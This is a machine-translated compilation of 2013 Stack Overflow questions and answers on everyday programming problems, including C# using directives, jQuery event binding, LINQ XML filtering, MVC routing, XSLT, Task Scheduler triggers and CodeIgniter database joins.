# c# - 在 C# 中，使用完全限定名称与“使用”指令相比性能更高吗？

> ID：15392766
> 
> 赞同：16
> 
> 时间：2013-03-13T17:50:23.867
> 
> 标签：c#, .net, performance, using-directives

在 C# 中，当您为命名空间添加[`using`指令](http://msdn.microsoft.com/en-us/library/sf0df423%28v=vs.100%29.aspx)时，您可以访问该特定命名空间中的所有类型。但是，如果命名空间有很多类型并且我只需要一个特定的类型，我通常只使用完全限定名称，因为我不想让任何我知道我不会使用的不必要的类可用（特别是如果**出于性能原因**，该名称空间中有很多）。我在想必须对性能产生一些影响（无论多小）才能使它们可用，而不是不可用，但是有多少呢？（如果真的有的话）。如果是这样，那么在所有地方都这样做是不好的做法，因为它不会开始积累一些值得注意的东西（性能方面）吗？

我确实看到了另一篇关于使用指令与完全限定名称的[SO 帖子](https://stackoverflow.com/questions/971612/is-fully-qualified-naming-vs-the-using-directive-simply-a-matter-of-opinion)`using`，但它与性能无关。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2013-03-13T17:53:13.537

该`using`指令只是在编译期间消失的语法糖。命名空间是否通过`using`完全限定的类型名称包含或提及在生成的字节码中完全无关紧要。因此，使用其中一种在运行时没有性能优势。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-03-13T17:53:07.247

没有区别。

它对编译器性能的影响/益处*可能*可以忽略不计（即可能无法衡量）（如运行 msbuild 时），但在运行时 IL 明确知道预期的类型，因为它在代码中作为类型句柄烘焙。除非使用反射，否则不会“搜索”类型。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-13T17:54:19.267

我必须说，不。编译器将生成相同的 IL 代码，因此您不必担心。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-13T17:56:10.793

这取决于。

使用 using 指令可以帮助您更快地编写代码。但是，如果您有例如 2 个名称空间，您在其中使用 using 指令，它们都具有相同名称和相同签名的方法，您将遇到麻烦。

使用完整的限定参考可以使您的代码更易于理解。

# magento - 当paypal窗口在magento中关闭时产品数量恢复

> ID：15392767
> 
> 赞同：0
> 
> 时间：2013-03-13T17:50:24.240
> 
> 标签：magento

在这里，我面临一个问题。下订单后通过贝宝在magento中创建订单时，它会重定向到贝宝。在这里，我没有支付金额，只是点击返回商家网站。在这种情况下，数量正在正确恢复为产品。在这种情况下，订单在管理端显示为 pending_payment 状态。

但例如，我没有点击贝宝中的任何按钮，也没有重定向到商家网站，只是关闭了窗口。在此期间，订单也在后端显示为 pending_payment 状态，但不将数量恢复为产品。

任何人都建议我在这种情况下该怎么做。

谢谢，壁画。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-04T09:28:02.440

我们将在半小时后删除此订单。

这是从订单网格中删除 pending_payment 订单的代码。为此，我们为删除贝宝挂单设置了一个 cron 作业。如果用户关闭贝宝窗口，它会恢复数量并删除该订单。你可以在这里查看。从下面的 url 复制代码并将其放在 magento 根文件夹中并设置 cron 以删除挂单:)

[http://eightlessons.blogspot.in/2013/03/delete-pendingpayment-order-status-from.html](http://eightlessons.blogspot.in/2013/03/delete-pendingpayment-order-status-from.html)

# sql-server - 通过 TeamCity 执行具有集成安全性的 Sql 在用户登录时失败

> ID：15392770
> 
> 赞同：0
> 
> 时间：2013-03-13T17:50:34.303
> 
> 标签：sql-server, continuous-integration, teamcity, msbuild-4.0, msbuildextensionpack

我有一个 MSBuild 脚本，它使用`SqlExecute`类似于以下的 MSBuildExtensions 命令：

```
<Target Name="DoSqlStuff">
    <SqlExecute TaskAction="Execute"
                UseTransaction="True"
                ConnectionString="Data Source=$(Sql_ServerName); Initial Catalog=$(Sql_DatabaseName); Integrated Security=SSPI;"
                Files="@(sqlFiles)"
                CommandTimeout="1800">
    </SqlExecute>
</Target> 
```

如果我从命令行运行它（使用所有正确的变量和诸如此类的东西），那么它就可以正常工作。

我有一个 TeamCity 构建代理设置为可以从命令行成功运行此 MSBuild 脚本（输入所有相同的变量）的同一台机器，我收到以下错误：

```
[MSBuild output] C:\BuildAgent\work\c5affefc453a825c\ContinuousBuild\Deploy.proj(22,3): error : SqlException: Login failed for user 'ALLIANCE\DANIELM$'. [C:\BuildAgent\work\c5affefc453a825c\ContinuousBuild\Deploy.proj.teamcity] 
```

我为此任务添加了一些调试输出：

```
<Message Text="Current user is $(USERNAME)" />
<Message Text="Current domain is $(USERDOMAIN)" /> 
```

通过cmd运行时，用户名为`danielm`

通过 TeamCity 运行时，用户名为`danielm$`

两者的域相同。

我做错了什么，或者我需要执行哪些后续步骤才能获取更多信息？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T22:15:29.433

经过一段尴尬的时间后，我想出了这个。

TeamCity Build Agent 服务设置为作为本地系统帐户登录。

我进入服务，右键单击 TeamCity 构建代理 -> 属性。

“登录”选项卡，然后单击“作为“此帐户”登录”的单选按钮并设置我的凭据。

将服务设置为以我的用户帐户登录为 MsBuild 脚本提供了使用集成安全登录的正确权限。

最终，当它准备好上线时，我们将为此目的创建一个用户。

# jquery - JQuery如何将点击事件绑定到所有复选框

> ID：15392772
> 
> 赞同：2
> 
> 时间：2013-03-13T17:50:42.013
> 
> 标签：jquery

我有多个这样的复选框

```
<input name="1[]" type="checkbox">
<input name="1[]" type="checkbox">
<input name="2[]" type="checkbox">
<input name="2[]" type="checkbox">
<input name="3[]" type="checkbox">
<input name="4[]" type="checkbox"> 
```

我如何将 onclick 绑定到所有这些复选框。并运行一个函数..让我们说一个提示“你点击一个列出的复选框”

```
 $("input").click() {

            return confirm("you click one of the listed checkbox?");

    }); 
```

这不起作用

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-13T17:52:28.143

您需要使其成为点击功能

```
$('input[type="checkbox"]').click(function() {
    alert("you click one of the listed checkbox?");
}); 
```

摆弄：http: [//jsfiddle.net/XQDfP/](http://jsfiddle.net/XQDfP/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T17:51:54.423

用于 `.change()`复选框、单选按钮等。

```
$("input[type=checkbox]").change(function() {
        return confirm("you click one of the listed checkbox?");
}); 
```

但是你的错误是你错过了让它成为点击的功能

```
$("input[type=checkbox]").click(function() {
        return confirm("you click one of the listed checkbox?");
}); 
```

# javascript - R中的googleVis数据类型转换似乎不起作用

> ID：15392774
> 
> 赞同：2
> 
> 时间：2013-03-13T17:50:47.233
> 
> 标签：javascript, r, types, charts, googlevis

我一直在使用“googleVis”和 R，以便使用 Google 图表 API 生成折线图。在 Google API 的教程中，我发现 Javascript 中的数据转换用于确定轴是否为“连续”（使用数字 Javascript 类型）和“离散”（使用字符串）。我相信 googleVis 是一样的，因为数据类型是从 R 派生的。问题是，在下面的示例中（我在从 R 演示函数中获取它之后对其进行了修改），X 轴值是等距的（因此，仍然是离散的），尽管它们似乎是“数字”

```
library(googleVis)
df=data.frame(val1=c(10,13,100), val2=c(23,12,32))
Line <- gvisLineChart(df)
plot(Line) 
```

有人可以请我帮助理解这一点吗？非常感谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-16T19:40:50.653

**完全披露：我喜欢 googleVis 包。**

即使在更新到最新版本的 googleVis（尚未在 CRAN 上）之后，我也看到了相同的行为。我不知道这是否是一个错误；gvisLineChart 的 googleVis 文档*提到*了连续数据，但我没有尝试将 X 轴绘制为数字。

如果您右键单击与绘图一起显示的网页，然后选择“查看页面源代码”，则可以了解在生成 googleVis 图表和图形时更改代码的各个方面时发生了什么。这个页面是魔法发生的地方，它是 googleVis 包的 HTML 输出。

在这种情况下，有问题的行是读取“data.addColumn('string','val1');

在这一行中，单词“string”应该是“number”，并且 val1 值不应在数据部分的引号中。

**但是，您可以通过使用 gvisScatterChart 来获得所需的结果：**

```
library(googleVis)
df=data.frame(val1=c(10,13,100), val2=c(23,12,32))
Line <- gvisScatterChart(df, options=list(lineWidth=2, pointSize=0))
plot(Line) 
```

# asp.net - asp.net mvc 4 路由隐藏“详细信息”操作

> ID：15392776
> 
> 赞同：0
> 
> 时间：2013-03-13T17:50:56.970
> 
> 标签：asp.net, asp.net-mvc, asp.net-mvc-4

我正在尝试进行 url 重写以仅隐藏我们的详细操作。

*   我们当前的网址是： **/subject/details/9839/MONTAGUT-FRENCH-ROMANTICS**
*   我们想将其更改为：**/subject/9839/MONTAGUT-FRENCH-ROMANTICS**
*   但是我们在这个控制器中还有其他操作，我们希望所有其他操作继续显示在 URL 中，例如 **/subject/category/1/RESTAURANTS**
*   有什么办法让它工作吗？

我们的 mapRoute 是：

```
routes.MapRoute(
            name: "SubejctDetails",
            url: "{controller}/{action}/{id}/{title}",
            defaults: new { controller = "Home", action = "Index", id = UrlParameter.Optional, title = "" },
            namespaces: new string[] { "website.Controllers" }
        ); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:54:34.497

试试这条路线：

```
routes.MapRoute(
            name: "SubjectDetails",
            url: "{controller}/{id}/{title}",
            defaults: new { controller = "Home", action = "details", id = UrlParameter.Optional, title = "" },
            namespaces: new string[] { "website.Controllers" }
        ); 
```

它应该完成您想要的（将其放在“默认”路线上方）。

我担心路线引擎永远无法判断您何时想要更经典的`/controller/action`路线。

为避免混淆路由，请考虑使用不同的范例：使用固定名称控制器或前导 slug。然后任何不包含前导 slug 的路由都将被忽略：

```
routes.MapRoute(
            name: "SubjectDetails",
            url: "subject/{id}/{title}",
            defaults: new { controller = "subject", action = "details", id = UrlParameter.Optional, title = "" },
            namespaces: new string[] { "website.Controllers" }
        ); 
```

现在该路线将仅适用于以“主题/”开头的网址

# c# - 根据子元素值 LINQ C# 选择父 XML 元素

> ID：15392778
> 
> 赞同：3
> 
> 时间：2013-03-13T17:51:02.917
> 
> 标签：c#, xml, linq, lambda

使用 LINQ 过滤相当大的 XML 文档时遇到一些困难。

这是我的 XML（其中的一部分）...

```
 <?xml version="1.0" encoding="UTF-8"?>
<response xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XML-Schema-instance" version="1.2" xsi:noNamespaceSchemaLocation="http://weather.aero/schema/metar1_2.xsd">
  <request_index>54966812</request_index>
  <data_source name="metars" />
  <request type="retrieve" />
  <errors />
  <warnings />
  <time_taken_ms>3</time_taken_ms>
  <data num_results="6">
    <METAR>
      <raw_text>KDEN 131653Z 06007KT 9SM FEW080 SCT140 BKN250 09/01 A3025 RMK AO2 SLP238 T00940006</raw_text>
      <station_id>KDEN</station_id>
      <observation_time>2013-03-13T16:53:00Z</observation_time>
      <latitude>39.83</latitude>
      <longitude>-104.65</longitude>
      <temp_c>9.4</temp_c>
      <dewpoint_c>0.6</dewpoint_c>
      <wind_dir_degrees>60</wind_dir_degrees>
      <wind_speed_kt>7</wind_speed_kt>
      <visibility_statute_mi>9.0</visibility_statute_mi>
      <altim_in_hg>30.250984</altim_in_hg>
      <sea_level_pressure_mb>1023.8</sea_level_pressure_mb>
      <quality_control_flags>
        <auto_station>TRUE</auto_station>
      </quality_control_flags>
      <sky_condition sky_cover="FEW" cloud_base_ft_agl="8000" />
      <sky_condition sky_cover="SCT" cloud_base_ft_agl="14000" />
      <sky_condition sky_cover="BKN" cloud_base_ft_agl="25000" />
      <flight_category>VFR</flight_category>
      <metar_type>METAR</metar_type>
      <elevation_m>1640.0</elevation_m>
    </METAR>
    <METAR>
      <raw_text>KSEA 131653Z 20006KT 10SM FEW008 BKN070 OVC200 11/08 A3019 RMK AO2 SLP232 T01060083</raw_text>
      <station_id>KSEA</station_id>
      <observation_time>2013-03-13T16:53:00Z</observation_time>
      <latitude>47.45</latitude>
      <longitude>-122.32</longitude>
      <temp_c>10.6</temp_c>
      <dewpoint_c>8.3</dewpoint_c>
      <wind_dir_degrees>200</wind_dir_degrees>
      <wind_speed_kt>6</wind_speed_kt>
      <visibility_statute_mi>10.0</visibility_statute_mi>
      <altim_in_hg>30.188976</altim_in_hg>
      <sea_level_pressure_mb>1023.2</sea_level_pressure_mb>
      <quality_control_flags>
        <auto_station>TRUE</auto_station>
      </quality_control_flags>
      <sky_condition sky_cover="FEW" cloud_base_ft_agl="800" />
      <sky_condition sky_cover="BKN" cloud_base_ft_agl="7000" />
      <sky_condition sky_cover="OVC" cloud_base_ft_agl="20000" />
      <flight_category>VFR</flight_category>
      <metar_type>METAR</metar_type>
      <elevation_m>136.0</elevation_m>
    </METAR> 
```

我要做的是获取所有落在纬度和经度范围内的 METAR 元素。例如：

纬度 > 52 && < 55 经度 < -121 && > -123

这个想法是捕获给定区域的 METAR。

这是我的代码：

```
 double southLat = 52.09;
     double northLat = 53.95;
     double westLong = -123.17;
     double eastLong = -121.87;

     XDocument response = XDocument.Load("file");

     var metars = response.Descendants("METAR")
        .Where
        (l => l.Element("latitude") != null || l.Element("longitude") != null
        && (Double)l.Element("latitude") >= southLat 
        && (Double)l.Element("latitude") <= northLat
        && (Double)l.Element("longitude") >= westLong
        && (Double)l.Element("longitude") <= eastLong
   ); 
```

我设法让第一部分工作（排除具有空纬度或经度值的元素......但是我仍然得到超出我想要的范围的METAR。

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T19:28:48.267

正如@roughnex 在评论中所说，以下行：

```
l.Element("latitude") != null || l.Element("longitude") != null 
```

需要改为：

```
l.Element("latitude") != null && l.Element("longitude") != null 
```

其原因在于[布尔逻辑的工作原理](http://en.wikipedia.org/wiki/Boolean_algebra)。

在您的代码中，您有以下条件语句：

```
l.Element("latitude") != null || l.Element("longitude") != null
&& (Double)l.Element("latitude") >= southLat 
&& (Double)l.Element("latitude") <= northLat
&& (Double)l.Element("longitude") >= westLong
&& (Double)l.Element("longitude") <= eastLong 
```

但是让我们删掉细节，让每个字母都是一个条件的地方更简单：

```
A || B && C && D && F 
```

当它简化为更简单的术语时，更容易看出如果`A`解析为`True`，则忽略条件的其余部分。这就是为什么你得到的结果超出了你想要的区域，因为它们的纬度不是空的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-01T23:26:24.873

作为参考，这是一个称为短路的编程概念。在布尔逻辑中，如果您有条件

```
A || B 
```

并且 A 的计算结果为真，则不会计算 B，因为无论 B 的值如何，表达式 (A || B) 都将为真。同样，如果

```
A && B 
```

并且 A 的计算结果为假，然后 B 不被计算，因为整个表达式将计算为假，而不管 B 的值。（假 && true 永远是假的。）

或者，如果

```
A || B 
```

并且 A 为假，则 B*必须*被计算，因为在 OR 比较中，只有一个为真，整个表达式为真（假 || 真为真）。所以既然A是假的，那么B仍然有可能是真的，所以我们必须检查一下。

# ios - 如何用可可和可可触摸做初级数学

> ID：15392786
> 
> 赞同：1
> 
> 时间：2013-03-13T17:51:19.890
> 
> 标签：ios, objective-c, cocoa

我对 xcode 很陌生，正在制作一个应用程序，您可以在其中将两个数字输入到文本输入中，但我不知道如何让 xcode 进行加和，我试过了，但它没有用

```
 self.answer.text = self.label.text + self.label2.text 
```

有人知道怎么做这个吗。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T17:52:11.970

采用 ：

```
NSInteger firstNumber=[self.label.text integerValue];
NSInteger secondNumber=[self.label2.text integerValue];
NSInteger total=firstNumber + secondNumber;
NSString *string=[NSString stringWithFormat:@"%d",total];

self.answer.text = string; 
```

如果你想取双值替换`integerValue`为`doubleValue`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-14T11:19:58.780

这是另一种有趣的方式：

```
//Some string with expression which was taken from self.label.text
NSString *s = @"2*(2.15-1)-4.1";
NSExpression *expression = [NSExpression expressionWithFormat:s];
float result = [[expression expressionValueWithObject:nil context:nil] floatValue];
NSLog(@"%f", result);
self.answer.text=[NSString stringWithFormat:@"%f",result]; 
```

# php - 在对象方法中返回值还是在对象方法中设置值？PHP

> ID：15392789
> 
> 赞同：1
> 
> 时间：2013-03-13T17:51:25.363
> 
> 标签：php, oop, methods, return

我可以编写两种不同方式做完全相同的事情的类；

```
class Simple {

    private $var;

    public function __construct() {

        $this->var = $this->setVar();
    }

    private function setVar() {

        return true;
    }
} 
```

或者

```
 class Simple {

    private $var;

    public function __construct() {

        $this->setVar();
    }

    private function setVar() {

        $this->var = true;
    }
} 
```

我什么时候会使用其中一个？我见过许多不同的 php 应用程序使用这两种不同的类型。但似乎没有可遵循的一般指导方针，或者这对这一事实是否重要？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T17:54:32.653

在我看来，这些都不像是正确的属性设置器。属性设置器应该接受一个参数，并将参数值分配给属性：

```
class Simple {
    private $var;
    public function setVar($val) {
        $this->var = $val;
    }

    public function getVar() {
        return $this->var;
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-13T17:52:51.747

设置者应该*设置*，而不是*返回*。这应该不需要更多的解释了。

# sorting - 在 XSLT 1.0 中移动列表元素后重命名列表元素。

> ID：15392797
> 
> 赞同：0
> 
> 时间：2013-03-13T17:51:33.877
> 
> 标签：sorting, xslt, dynamic

我有这个xml：

```
 <Process>
          <elem0>
             <pcode>xx<pcode>
          </elem0>
          <elem1>
             <pcode>xy<pcode>
          </elem1>
          <elem2>
             <pcode>ab<pcode>
          </elem2>
          <elem3>
             <pcode>AD<pcode>
          </elem3>               
    </Process> 
```

而且我必须将 pcode value='xy' 的元素移动到 EdProcess，我使用 xslt 成功地做到了这一点。此外，在其他成员的帮助下，我让流程元素按顺序显示。现在的问题是，EdProcess 需要从 elem0 开始，并且在其中移动的任何新元素都应该按顺序排列，即 elem0、elem1、elem2 等。

```
<Process>
      <elem0>
         <pcode>xx<pcode>
      </elem0>
      <elem1>
         <pcode>ab<pcode>
      </elem1>
      <elem2>
         <pcode>AD<pcode>
      </elem2>               
</Process>

<EdProcess>
          <elem1>
             <pcode>xy<pcode>
          </elem1>
   </EdProcess> 
```

我希望它是

```
<Process>
          <elem0>
             <pcode>xx<pcode>
          </elem0>
          <elem1>
             <pcode>ab<pcode>
          </elem1>
          <elem2>
             <pcode>AD<pcode>
          </elem2>               
    </Process>

 <EdProcess>
          <elem0>
             <pcode>xy<pcode>
          </elem0>
   </EdProcess> 
```

所以它在前端正确显示，但我被卡住了。尝试排序但没有用。elem 标识正在发生变化，因此我很难使用某种模板。由于我正在创建 EdProcess，因此模板匹配不起作用。谢谢指教！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T17:57:51.383

这可以通过对我对您上一个问题的回答进行小的修改来完成：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="xml" indent="yes"/>

  <xsl:template match="@* | node()">
    <xsl:copy>
      <xsl:apply-templates select="@* | node()"/>
    </xsl:copy>
  </xsl:template>

  <xsl:template match="/*">
    <root>
      <Process>
        <xsl:apply-templates select="*[pcode != 'xy']" mode="elems" />
      </Process>
      <EdProcess>
        <xsl:apply-templates select="*[pcode = 'xy']" mode="elems" />
      </EdProcess>
    </root>
  </xsl:template>

  <xsl:template match="*" mode="elems">
    <xsl:element name="elem{position() - 1}">
      <xsl:apply-templates select="@* | node()" />
    </xsl:element>
  </xsl:template>
</xsl:stylesheet> 
```

在以下输入上运行时：

```
<Process>
  <elem0>
    <pcode>xx</pcode>
  </elem0>
  <elem1>
    <pcode>xy</pcode>
  </elem1>
  <elem2>
    <pcode>ab</pcode>
  </elem2>
  <elem3>
    <pcode>xy</pcode>
  </elem3>
  <elem4>
    <pcode>AD</pcode>
  </elem4>
</Process> 
```

结果是：

```
<root>
  <Process>
    <elem0>
      <pcode>xx</pcode>
    </elem0>
    <elem1>
      <pcode>ab</pcode>
    </elem1>
    <elem2>
      <pcode>AD</pcode>
    </elem2>
  </Process>
  <EdProcess>
    <elem0>
      <pcode>xy</pcode>
    </elem0>
    <elem1>
      <pcode>xy</pcode>
    </elem1>
  </EdProcess>
</root> 
```

# powershell - 编辑 Windows 任务计划程序任务的触发器

> ID：15392798
> 
> 赞同：2
> 
> 时间：2013-03-13T17:51:35.313
> 
> 标签：powershell, cmd, scheduled-tasks, powershell-2.0, windows-server-2008-r2

我们目前在我们的 server 2008 机器上的 Windows 任务计划程序中安排了数百个任务。有许多任务无限期地每半小时运行一次。有没有办法使用脚本来更改这些任务的触发器，以便它们只会每半小时 MF 运行一次？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T18:31:25.127

是的，如果您使用[TaskService COM 对象](https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-objects)。有关使用此对象的一些示例脚本，请参阅以下内容：

1.  [在 Windows 7、Windows Server 2008 和 Windows Vista 中重命名计划任务](https://www.itprotoday.com/powershell/powershell-script-rename-scheduled-tasks-windows-7-windows-server-2008-and-windows-vista)

2.  [操作方法：使用 PowerShell 报告计划任务](https://www.itprotoday.com/powershell/how-use-powershell-report-scheduled-tasks)

3.  [更新计划任务的凭据](https://www.itprotoday.com/devops-and-software-development/updating-scheduled-tasks-credentials)

    脚本：[https ://gist.github.com/Bill-Stewart/363fdf761499a071439c8ac0c18dcd54](https://gist.github.com/Bill-Stewart/363fdf761499a071439c8ac0c18dcd54)

在 Windows XP/Server 2003 之后，使用 schtasks.exe 实用程序相当有限。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-13T19:15:11.113

Here are the allowed options for /SC:

```
/SC allows for the following frequency schedules:
        MINUTE:     1 - 1439 minutes.
        HOURLY:     1 - 23 hours.
        DAILY:      1 - 365 days.
        WEEKLY:     weeks 1 - 52\. (/D MON,TUE,WED,THU,FRI,SAT,SUN)
        ONCE:       No modifiers.
        ONSTART:    No modifiers.
        ONLOGON:    No modifiers.
        ONIDLE:     No modifiers.
        MONTHLY:    1 - 12, or FIRST, SECOND, THIRD, FOURTH, LAST, LASTDAY.** 
```

*I keep editing this because I'm not happy with my findings...*

I have looked into the SCHTASKS and noticed that you cannot CHANGE for the schedule through CMD.

**From [technet.microsoft](http://technet.microsoft.com/en-us/library/bb490996.aspx)**
Changes one or more of the following properties of a task.

*   The program that the task runs (/tr).
*   The user account under which the task runs (/ru).
*   The password for the user account (/rp).

I am going to continue to do some research on this, and hopefully will edit this answer with a workable solution.

**EDIT**
If you look in C:\windows\system32\tasks you will find all of your scheduled tasks They're not listed as XML, but they are indeed XML What I think should be done is using either; VBS or C# application dig to each of the following Nodes
//Task/Triggers/CalendarTrigger to delete /ScheduleByDay and it's child node /DaysInterval //Task/Triggers/CalendarTrigger to create the following:

```
 <?xml version="1.0" encoding="UTF-16"?>
   -<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task" version="1.2"> 
     +<RegistrationInfo> 
     -<Triggers> 
       -<CalendarTrigger>
            <StartBoundary>2013-03-13T15:20:00</StartBoundary>
            <Enabled>true</Enabled> 
             -<ScheduleByWeek> 
               -<DaysOfWeek> 
                    <Monday/>
                    <Tuesday/> 
                    <Wednesday/> 
                    <Thursday/> 
                    <Friday/> 
                </DaysOfWeek>
                <WeeksInterval>1</WeeksInterval> 
              </ScheduleByWeek> 
       </CalendarTrigger> 
     </Triggers> 
```

If anyone can pick up and run with this - I don't think I'll be able to do much with this in the next week.

# javascript - 替换 Javascript 中的插入符号

> ID：15392807
> 
> 赞同：3
> 
> 时间：2013-03-13T17:51:59.323
> 
> 标签：javascript

我正在尝试用 Javascript 中的空格替换字符串中的多个插入符号 (^)。在替换（）上的 w3schools 条目之后，我使用了以下代码：

```
var str = "Salt^Lake^City, UT";
var result = str.replace(/^/g, " "); 
```

但是，值为`result`“Salt^Lake^City, UT”。当我运行此代码时，一个插入符号被替换：

```
var result = str.replace("^", " "); 
```

但我想替换所有任意数量的插入符号。关于在 Javascript 中进行全局替换，我有什么明显的遗漏吗？我可以编写一个函数`str.replace("^", " ");`来删除所有插入符号，但我宁愿使用内置的全局替换。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-13T17:53:37.507

该`^`字符与正则表达式中字符串的开头匹配，因此您需要对其进行转义，以便将其视为文字字符。这就是为什么在您的示例中，结果字符串在字符串的开头添加了一个新空格。

```
var result = str.replace(/\^/g, " "); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T18:12:20.193

您还可以使用另一种方便的方式，即回旋处。

```
var result = str.split('^').join(' ') ; 
```

# android - BuildConfig.DEBUG 是否覆盖为 true 以进行发布构建？

> ID：15392810
> 
> 赞同：0
> 
> 时间：2013-03-13T17:52:04.180
> 
> 标签：android, adt

是否有任何方法，至少是暂时的，告诉 ADT 将 BuildConfig.DEBUG 保留为 TRUE，即使对于发布版本也是如此？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:54:41.833

那时，您应该只创建自己的常量，例如

```
public class MyConfig {
    public static final boolean DEBUG = true;
} 
```

BuildConfig 真的是用来判断它是调试版本还是生产版本。

请注意，您可以从代码外部修改自己的常量。例如，在 Linux 或 OSX 上：

```
#!/bin/bash
cat MyConfig.java | sed -e 's/DEBUG = true/DEBUG = false/g' > newMyConfig.java
mv newMyConfig.java myConfig.java
ant release 
```

这只是通过外部源重写配置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-05T10:43:47.953

每次我将项目作为 android 应用程序运行时，我都面临同样的问题，它曾经在调试器模式下打开，但后来问题解决了。

- 如果您在 Eclipse 中工作，则必须使用 Java EE 透视图 - 而只是选择 Java 透视图。

- 清理你的应用程序。- 从设备上卸载应用程序。- 重新启动您的设备（就像这样，以便不存储缓存） - 运行您的应用程序。

这次不会显示调试器模式。复制 bin 文件夹中生成的 apk 并在其他设备上试用

# jquery - 将包含输入和选择等表单元素的jquery对象转换为json

> ID：15392813
> 
> 赞同：1
> 
> 时间：2013-03-13T17:52:12.853
> 
> 标签：jquery, json

我有以下 HTMLTableRowElement。我需要根据输入和选择元素的名称字段和对应值将其转换为 json。是否有库或 jquery 方法可以做到这一点？当在行的 jquery 对象上调用时，jquery 的 serializeArray 方法返回一个空数组，例如 $('the following HTMLTableRowElement').serializeArray()。

```
<tr id="row7">
        <td>
            <input type="text" id="person_row7" name="person_row7">
        </td>
        <td>
            <input type="text" id="father_row7" name="father_row7">
        </td>
        <td>
            <input class="input-mini" type="text" id="age_row7" name="age_row7">
        </td>
        <td>
            <select id="gender_row7" class="input-small" name="gender_row7">
                <option value="" selected="selected">
                    ---------
                </option>
                <option>
                    Male
                </option>
                <option>
                    Female
                </option>
            </select>
        </td>
        <td>
            <input id="phonenumber_row7" name="phonenumber_row7" type="text">
        </td>
</tr> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T18:16:34.880

您需要针对 tr 内的表单元素 - serializeArray 不适用于 tr - 只有表单元素和表单控件

来自 jQuery [.serializeArray()](http://api.jquery.com/serializeArray/)文档

> 此方法可以作用于已选择单个表单元素（例如 、 和 ）的`<input>`jQuery`<textarea>`对象`<select>`。但是，通常更容易选择`<form>`标签本身进行序列化：

```
// serialize all form controls with a name attribute
$('#row7 :input[name]').serializeArray(); 
```

[小提琴](http://jsfiddle.net/UdQKK/)

# php - 我如何设计一个 php 数据库调用？

> ID：15392816
> 
> 赞同：1
> 
> 时间：2013-03-13T17:52:18.543
> 
> 标签：php, mysql, oop, codeigniter

规格：PHP 5 和基于 Codeigniter 框架构建的 mySQL。

我有一个名为的数据库表`game`，然后是特定的表，例如`soccerGame`和`footballGame`。这些运动特定的表格有一个`gameId`链接回表格的字段`game`。我有相应的类`game`和`soccerGame`/ `footballGame`，它们都扩展了`game`.

当我查找要显示给用户的游戏信息时，我无法弄清楚如何动态链接这两个表。我很好奇是否可以通过一次查询获得所有信息。问题是，我需要先查询`game`表才能找出运动名称。

如果那不可能，我的下一个想法是用两个查询来完成。让我`game_model`查询比赛表，然后根据运动名称，调用适当的运动特定模型（即`soccer_game_model`）并获取运动特定信息。

我还将`game`对象传递到 中`soccer_model`，然后`soccer_model`使用该对象为我构建一个`soccerGame`对象。这对我来说似乎有点傻，因为我正在构建父对象，然后将其提供给扩展类以创建一个全新的对象？

想法？

谢谢您的帮助。

编辑：

游戏桌

```
gameId
sport (soccer, basketball, football, etc)
date
other data 
```

足球游戏桌

```
soccerGameId
gameId
soccer specific information 
```

足球游戏桌

```
footballGameId
gameId
football specific information 
```

等等其他运动

所以我需要知道这项运动是什么，然后才能决定我需要从哪个运动特定表中提取信息。

更新：

感谢大家的投入。似乎动态 SQL 只能通过存储过程实现，我现在不太熟悉。即使有他们，它仍然有点混乱。现在我将走两条查询路线，一条获取运动名称，然后切换获取正确的型号。

`game`从现在的 PHP 方面来看，获取一个对象，将其传递给 my `soccer_game_model`，然后让它返回我一个`soccer_game`对象，它是原始的子对象，这似乎有点愚蠢`game`。必须这样做吗？或者我在这里从面向对象的角度错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T18:24:15.947

To extend on Devin Young's answer, you would achieve this using Codeigniter's active record class like so:

```
public function get_game_by_id($game_id, $table)
{
    return $this->db->join('game', 'game.id = ' . $table .  '.gameId', 'left')
    ->where($table . '.gameId', $game_id)
    ->get('game')
    ->result();
} 
```

So you're joining the table by the gameId which is shared, then using a where clause to find the correct one. Finally you use result() to return an array of objects.

EDIT: I've added a second table paramater to allow you to pass in the name of the table you can join either soccerGame, footballGame table etc.

If you don't know which sport to choose at this point in the program then you may want to take a step back and look at how you can add that so you do know. I would be reluctant to add multiple joins to all sport tables as you''ll run into issues down the line.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T18:29:47.703

[查看此 Stack Overflow 答案，](https://stackoverflow.com/questions/5454001/mysql-inner-join-table-based-on-column-value)了解如何通过标准查询进行操作。然后，您可以根据需要将其转换为活动记录（尽管如果您的应用程序中不需要与 DB 无关的调用，这可能会很复杂并且不值得您花时间）。

值得一提的是，执行多个查询并没有错，只是可能比替代方法慢。尝试几个选项，看看最适合您和您的应用程序的选项。

* * *

## 回答 #3

> 赞同：1
